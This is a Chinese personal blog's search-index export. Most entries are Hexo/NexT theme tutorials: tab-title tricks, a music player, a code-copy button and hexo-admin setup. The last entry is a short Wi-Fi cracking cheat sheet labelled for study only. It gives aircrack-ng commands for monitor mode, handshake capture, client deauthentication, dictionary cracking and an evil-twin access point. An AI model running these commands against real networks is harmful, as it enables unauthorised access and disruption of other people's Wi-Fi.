    <content type="text"><![CDATA[效果离开网页，标题出现一行文字重新回到网页，标题又显示另一行文字 代码在next\source\js\src文件夹下创建crash_cheat.js，代码如下：1234567891011121314151617&lt;!--崩溃欺骗--&gt; var OriginTitle = document.title; var titleTime; document.addEventListener(&apos;visibilitychange&apos;, function () &#123; if (document.hidden) &#123; $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/images/panda16.icon&quot;); document.title = &apos;页面崩溃点击恢复&apos;; clearTimeout(titleTime); &#125; else &#123; $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/images/panda16.icon&quot;); document.title = &apos;页面修复成功&apos; ; titleTime = setTimeout(function () &#123; document.title = OriginTitle; &#125;, 2000); &#125; &#125;); 引用代码在next\layout_layout.swig文件中，添加引用（注：在/body前即可）：12&lt;!--崩溃欺骗--&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/crash_cheat.js&quot;&gt;&lt;/script&gt; 参考文章asdfv1929的博客]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[next主题添加音乐播放器]]></title>
    <url>%2Fnext%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90.html</url>
    <content type="text"><![CDATA[添加APlayer播放器原由之前把播放器嵌在站点概览里，在手机端显示不了导致不能停止音乐 下载项目地址下载解压后将dist文件夹复制到themes\next\source文件夹下 安装在themes\next\source\dist文件夹下创建music.js文件12345678910111213141516171819202122232425262728const ap = new APlayer(&#123; container: document.getElementById(&apos;aplayer&apos;), fixed: true, //吸底模式 autoplay: true, //自动播放 theme: &apos;#FADFA3&apos;, //主题色 loop: &apos;all&apos;, //音频循环播放, 可选值: &apos;all&apos;全部循环, &apos;one&apos;单曲循环, &apos;none&apos;不循环 order: &apos;random&apos;, //音频循环顺序, 可选值: &apos;list&apos;列表循环, &apos;random&apos;随机循环 preload: &apos;auto&apos;, //预加载，可选值: &apos;none&apos;, &apos;metadata&apos;, &apos;auto&apos; volume: 0.7, //默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效 mutex: true, //互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器 listFolded: false, //列表默认折叠 listMaxHeight: 90, //列表最大高度 lrcType: 0, //歌词传递方式 audio: [ &#123; name: &quot;思念是一种病&quot;, artist: &apos;张震岳 / 蔡健雅&apos;, url: &apos;http://www.ytmp3.cn/down/50020.mp3&apos;, cover: &apos;http://p2.music.126.net/N61oLy0iLfEkZTHD2j87iA==/18693896697392706.jpg?param=130y130&apos;, &#125;, &#123; name: &quot;这就是爱情&quot;, artist: &apos;李代沫&apos;, url: &apos;http://www.ytmp3.cn/down/54477.mp3&apos;, cover: &apos;http://p1.music.126.net/RQBF9kqZb7PtLCaOxi9ngQ==/109951163053984533.jpg?param=130y130&apos;, &#125;, ]&#125;); 源码中的参数可以参考官方文档 audio对应的便是音频文件，在里面添加音乐 音乐的外链可以去下面的网站搜索复制音乐图片我是在网易云里搜索同一首歌曲找到的 运行程序打开themes\next\layout_layout.swig文件，将下述程序添加添加到&lt; body itemscope … &gt;后面就行，即在&lt; body &gt;&lt; /body &gt;里面1234&lt;link rel=&quot;stylesheet&quot; href=&quot;/dist/APlayer.min.css&quot;&gt;&lt;div id=&quot;aplayer&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/dist/APlayer.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/dist/music.js&quot;&gt;&lt;/script&gt; 音乐外链音乐网站1:www.ytmp3.cn 音乐网站2:www.170hi.com]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo代码复制]]></title>
    <url>%2Fhexo%E4%BB%A3%E7%A0%81%E5%A4%8D%E5%88%B6.html</url>
    <content type="text"><![CDATA[hexo-next添加代码块复制功能clipboard.js下载项目地址详细内容可以前往查看，如是只需实现功能即可右键下载。将clipboard.js保存到theme/next/source/js/src下 使用在theme/next/source/js/src下创建clipboard-use.js文件代码如下 1234567891011121314151617/*页面载入完成后，创建复制按钮*/!function (e, t, a) &#123; /* code */ var initCopyCode = function()&#123; var copyHtml = &apos;&apos;; copyHtml += &apos;&lt;button class=&quot;btn-copy&quot; data-clipboard-snippet=&quot;&quot;&gt;&apos;; copyHtml += &apos;&lt;span&gt;复制&lt;/span&gt;&apos;; copyHtml += &apos;&lt;/button&gt;&apos;; $(&quot;.highlight .code pre&quot;).before(copyHtml); new ClipboardJS(&apos;.btn-copy&apos;, &#123; target: function(trigger) &#123; return trigger.nextElementSibling; &#125; &#125;); &#125; initCopyCode();&#125;(window, document); 在theme/next/source/css/_custom/custom.styl样式中添加如下代码：123456789101112131415161718192021222324252627282930313233343536//代码块复制按钮.highlight&#123; //方便copy代码按钮（btn-copy）的定位 position: relative;&#125;.btn-copy &#123; display: inline-block; cursor: pointer; background-color: #eee; background-image: linear-gradient(#fcfcfc,#eee); border: 1px solid #d5d5d5; border-radius: 3px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; -webkit-appearance: none; font-size: 13px; font-weight: 700; line-height: 20px; color: #333; -webkit-transition: opacity .3s ease-in-out; -o-transition: opacity .3s ease-in-out; transition: opacity .3s ease-in-out; padding: 2px 6px; position: absolute; right: 5px; top: 5px; opacity: 0;&#125;.btn-copy span &#123; margin-left: 5px;&#125;.highlight:hover .btn-copy&#123; opacity: 1;&#125; 引用在themes/next/layout/_layout.swig文件中引用（/body）之前添加：123&lt;!-- 代码块复制功能 --&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clipboard.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clipboard-use.js&quot;&gt;&lt;/script&gt;]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali软件小技巧]]></title>
    <url>%2Fkali%E5%BA%94%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
    <content type="text"><![CDATA[kali应用总结卸载软件删除配置 apt-get purge XXXX 安装截图软件下载安装python-xlib apt-get install python-xlib 下载安装截图软件包 wget http://packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb 安装软件包 dpkg -i deepin-scrot* 运气比较好，安装没有报错。据说如果报错啥的可能需要安装依赖，可以通过强制执行安装依赖命令解决问题 报错了参考下面的方法 强制安装依赖包 apt-get -f install 重新安装截图软件包 sudo dpkg -i deepin-scrot* 如果顺利的话 此时应该执行deepin-scrot就可截图了 设置快捷键在设置页面自定义快捷件，由于用QQ截图习惯了，我设置的Ctrl+Alt+A]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>kali软件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo-admin插件]]></title>
    <url>%2Fhexo-admin%E6%8F%92%E4%BB%B6.html</url>
    <content type="text"><![CDATA[hexo倒腾系列 原由近几天将hexo的next主题倒腾差不多了，开始尝试着写博客了，听说用hexo-admin插件编辑文章还是挺方便的 安装进入hexo源文件目录，执行命令： npm install –save hexo-admin 配置编辑根目录下：_config.yml文件，添加：1234admin: username: myfavoritename password_hash: be121740bf988b2225a313fa1f107ca1 secret: a secret something 其中：username为登录的用户名，password_hash为密码的bcrypt哈希值，secret用于使cookie安全,可以尽可能复杂。 生成password_hash方法 安装模块：sudo npm install bcrypt-nodejs 执行：123$ node&gt;const bcrypt = require(&apos;bcrypt-nodejs&apos;)&gt; bcrypt.hashSync(&apos;your_password&apos;) #your_password为登录密码。 参考博客]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wi-Fi密码破解]]></title>
    <url>%2FWi-Fi%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98.html</url>
    <content type="text"><![CDATA[仅供学习参考 总结 wifi密码破解将WLAN0网卡开启混杂模式 airmon-ng start wlan0 ##提示要杀掉一些进程 airmon-ng check kill airmon-ng start wlan0 1、查看附近Wi-Fi airodump-ng wlan0mon 2、进行握手包监听与获取 airodump-ng -c 通道值 —bssid wifi的mac值 -w cap文件名 wlan0mon ##其中wlan0mon是启动混杂模式的网卡名 3、断网抓取握手包（另开一个窗口） aireplay-ng -0 20 -c 客户机mac值 -a wifi热点mac值 wlan0mon #-0 death模式 20为发送次数 4、跑包 aircrack-ng -w 字典 包名 关闭混杂模式 airmon-ng stop wlan0mon 启动网络 service network-manager start ——————————分割线——————————— 构造同名的虚假AP airbase-ng —essid wifi名 -c 6 -Z 4 wlan0mon -c 代表channel信道 -Z代表WPA2加密 -z代表WPA1加密 z后面的参数1～5分别表示WEP40、TKIP、WRAP、CCMP、WEP104]]></content>
      <categories>
        <category>无线学习</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
</search>
